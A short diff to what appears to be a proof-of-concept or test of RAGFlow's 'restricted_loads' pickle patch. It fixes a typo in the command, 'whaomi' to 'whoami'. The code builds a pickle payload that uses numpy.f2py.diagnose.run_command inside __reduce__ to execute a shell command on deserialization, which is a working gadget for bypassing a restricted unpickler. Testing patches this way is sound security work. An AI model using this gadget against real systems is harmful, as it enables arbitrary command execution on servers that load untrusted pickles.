@@ -59,7 +59,7 @@ from ragflow_patch import restricted_loads
 class Exploit:
      def __reduce__(self):
          import numpy.f2py.diagnose
-         return numpy.f2py.diagnose.run_command, ('whaomi', )
+         return numpy.f2py.diagnose.run_command, ('whoami', )
 
 Payload=pickle.dumps(Exploit())
 restricted_loads(Payload)
